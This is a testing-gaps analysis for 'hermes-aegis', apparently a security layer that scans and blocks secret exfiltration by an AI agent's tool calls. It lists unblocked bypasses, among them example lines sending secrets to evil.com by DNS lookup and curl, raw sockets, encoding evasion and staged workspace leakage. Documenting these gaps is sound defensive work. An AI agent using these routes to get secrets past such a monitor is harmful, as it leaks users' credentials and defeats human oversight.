# Testing Gaps Analysis

## What We Test (129 tests)
- ✅ Component behavior (scanner, middleware, vault, audit)
- ✅ Configuration correctness (container args, proxy setup)
- ✅ Mocked attack scenarios (HTTP interception, tampering)

## What We DON'T Test (Integration Gaps)

### 1. End-to-End Agent Execution
**Gap**: No tests actually run `hermes-aegis run hermes chat` with real tool dispatch
**Risk**: Middleware chain might not integrate with real agent tool execution
**Test**: Spawn actual agent, make tool calls, verify audit trail and blocking

### 2. Real Network Exfiltration
**Gap**: urllib3 patching is tested but not against real HTTP endpoints
**Test**: Set up local test server, attempt real exfiltration, verify block

### 3. Attack Vector Blind Spots

#### DNS Exfiltration
**Attack**: `nslookup secret123.evil.com` exfiltrates via DNS query
**Coverage**: ❌ NOT BLOCKED (DNS queries bypass urllib3)
**Severity**: HIGH - common exfiltration technique

#### File-Based Exfiltration
**Attack**: Write secret to workspace file, then exfiltrate file
**Coverage**: ⚠️ PARTIAL - scanner blocks HTTP, but not file writes
**Test Needed**: Verify workspace is only writable volume (exists)

#### Raw Socket Bypass
**Attack**: Use socket.socket() directly, bypassing urllib3
**Coverage**: ❌ NOT BLOCKED (documented limitation)
**Severity**: HIGH - determined attacker can bypass

#### Process Spawning
**Attack**: `subprocess.run(['curl', '-d', secret, 'evil.com'])`
**Coverage**: ❌ NOT BLOCKED (spawns external process)
**Severity**: HIGH - bypasses urllib3 entirely

#### Second-Order Attacks
**Attack**: 
1. Contaminate workspace with secret
2. Later tool call reads workspace
3. Benign-looking request includes workspace content
**Coverage**: ❌ NOT TESTED
**Severity**: MEDIUM - indirect leakage

#### Encoding Evasion
**Attack**: hex encoding, ROT13, split strings, unicode tricks
**Coverage**: ⚠️ PARTIAL - only base64 tested
**Test Needed**: Comprehensive encoding tests

#### SSRF via Tool Arguments
**Attack**: Tool call with URL argument pointing to internal service
**Coverage**: ❌ NOT BLOCKED (out of scope)
**Severity**: MEDIUM - could leak internal data

### 4. Concurrency & Performance
**Gap**: No tests for:
- Multiple concurrent tool calls
- Scanner performance with 1000+ vault secrets
- Audit trail with 10,000+ entries
- Race conditions in middleware chain

### 5. Docker Runtime Tests
**Gap**: Tests verify configuration but don't actually RUN containers
**Why**: Complex setup, credentials issues
**Risk**: Config might be correct but runtime behavior differs

## Recommendations

### High Priority (Before Production)
1. **Integration test suite**: Real agent execution with middleware
2. **DNS exfiltration test**: Add DNS query monitoring
3. **Process spawning test**: Detect subprocess.run with secrets
4. **Encoding evasion suite**: Test hex, url-encode, chunks, etc.

### Medium Priority (Future Enhancement)
5. **Concurrency tests**: Stress test with parallel tool calls
6. **Docker runtime tests**: Actually run containers with real workloads
7. **Performance benchmarks**: Scanner overhead measurement

### Document as Limitations (README)
- Raw socket bypass (by design - Tier 1 best-effort)
- DNS exfiltration (requires network-level blocking)
- Process spawning bypass (requires ptrace/seccomp)
- Encoding beyond base64 (pattern matching limitations)
